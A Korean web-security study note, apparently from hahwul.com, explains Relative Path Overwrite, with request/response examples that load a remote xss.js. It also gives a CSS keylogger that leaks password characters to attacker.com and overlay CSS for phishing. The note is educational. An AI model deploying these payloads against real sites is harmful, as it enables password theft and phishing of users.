
# 출처
https://www.hahwul.com

# 개념
Relative Path Overwrite
relative URL, 즉 상대 경로 기반의 URL을 덮어써서 의도하지 않은 동작을 수행하는 공격 방법
Relative Path Confusion이라고도 불림

[[RFI]]와 의 차이점은 RFI는 주로 외부에서 파일을 가져와 실행시키려는 것이고, 
RPO는 원격서버에서 파일 경로 또는 코드를 가져와서 포함시키려는 것
혼용되는 경우가 많다고 함

	Path	Description	Example
	Absolute URL	Host가 포함된 URL	<script src=”https://www.hahwul.com/file.js”>
	Relative URL	Host가 포함되지 않은 URL	<src=”/file.js”>

link, script 등 resource를 읽어오는 과정에서 Host가 포함되지 않은 URL을 Relative URL이라고 하고, 
이를 Overwrite할 수 있는 경우에 resource의 주소 등을 조작하여 공격자가 원하는 액션으로 유도할 수 있게 됨(사실상 XSS임)

Path traversal과 동일하게 ../ 를 이용해 상위 경로의 다른 파일을 로드하거나, 
Protocol-relative URL 을 이용하여 Host를 공격자가 원하는 도메인으로 변경하여 공격을 수행할 수 있음

Path traversal

	[ Req ]
	GET /page?sink=../../../upload/my_script.js

	[ Res ]
	...
	<script src="asset/js/vendor/../../../upload/my_script.js"></script>
	...

Ptorocol-relative URL

	[ Req ]
	GET /page?test=//www.hahwul.com/xss.js

	[ Res ]
	...
	<script src="//www.hahwul.com/xss.js"></script>
	...

일반적인 시나리오로는 XSS와의 연계를 하여 공격하는 것
공격자의 remote 서버, 또는 해당 도메인에 업로드가 가능한 경로를 찾아 
xss 코드가 포함된 js 파일을 업로드하고, Relative Path Overwrite를 통해 이를 트리거


# Sequential Import Chaining
CSS를 컨트롤할 수 있는 경우 이를 이용하여 Keylogger와 같은 페이로드를 구성할 수 있음

```css
input[name=password][value^=a]{
	background: url('https://attacker.com/a');
}
input[name=password][value^=b]{
	background: url('https://attacker.com/b');
}
/* ... */
input[name=password][value^=9]{
	background: url('https://attacker.com/9');   
}
```

다음과 같은 css를 로드하게 만들면, 해당 input box에서 버튼을 누를때 마다,
원격 서버에서 해당 키를 누르게 된 것을 알게 된다.


# Phishing
CSS Injection과 동일하게 position:fix 등으로 레이어를 분리하고, 
악의적인 컨텐츠를 담아 피싱등을 유도할 수 있음

```css
.attack {
	position: fixed;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
	z-index: 999999;
}
```
